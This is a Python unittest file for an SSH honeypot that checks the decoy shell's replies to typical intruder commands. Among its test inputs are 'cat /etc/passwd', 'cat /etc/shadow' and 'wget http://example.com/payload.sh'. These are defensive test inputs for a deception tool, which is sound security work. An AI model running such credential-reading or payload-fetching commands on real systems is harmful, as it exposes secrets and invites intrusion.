"""Tests for SSH honeypot basic functionality."""

import unittest
from honeytrap.events import EventBus
from honeytrap.honeypots.ssh_honeypot import SSHHoneypot, FakeShell


class TestFakeShell(unittest.TestCase):
    """Test the fake shell command responses."""

    def test_whoami(self):
        shell = FakeShell(username="testuser")
        output = shell.execute("whoami")
        self.assertEqual(output, "testuser")

    def test_id_root(self):
        shell = FakeShell(username="root")
        output = shell.execute("id")
        self.assertIn("uid=0(root)", output)

    def test_uname(self):
        shell = FakeShell(username="root")
        output = shell.execute("uname -a")
        self.assertIn("Linux", output)

    def test_ls(self):
        shell = FakeShell(username="root")
        output = shell.execute("ls")
        self.assertTrue(output)

    def test_ls_la(self):
        shell = FakeShell(username="root")
        output = shell.execute("ls -la")
        self.assertTrue("drwx" in output or "total" in output)

    def test_cat_etc_passwd(self):
        shell = FakeShell(username="root")
        output = shell.execute("cat /etc/passwd")
        self.assertIn("root:", output)

    def test_cat_etc_shadow_denied(self):
        shell = FakeShell(username="www-data")
        output = shell.execute("cat /etc/shadow")
        self.assertTrue("denied" in output.lower() or "shadow" in output.lower())

    def test_hostname(self):
        shell = FakeShell(username="root")
        output = shell.execute("hostname")
        self.assertTrue(output)

    def test_wget_logs_url(self):
        shell = FakeShell(username="root")
        output = shell.execute("wget http://example.com/payload.sh")
        self.assertTrue("payload.sh" in output or "example.com" in output)

    def test_unknown_command(self):
        shell = FakeShell(username="root")
        output = shell.execute("nonexistentcommand")
        self.assertIn("not found", output.lower())

    def test_exit(self):
        shell = FakeShell(username="root")
        output = shell.execute("exit")
        self.assertTrue(output is None or "logout" in output.lower() or output == "")

    def test_pwd(self):
        shell = FakeShell(username="root")
        output = shell.execute("pwd")
        self.assertIn("/", output)

    def test_uptime(self):
        shell = FakeShell(username="root")
        output = shell.execute("uptime")
        self.assertTrue("up" in output or "load" in output)

    def test_df(self):
        shell = FakeShell(username="root")
        output = shell.execute("df -h")
        self.assertTrue("Filesystem" in output or "/" in output)


if __name__ == "__main__":
    unittest.main()
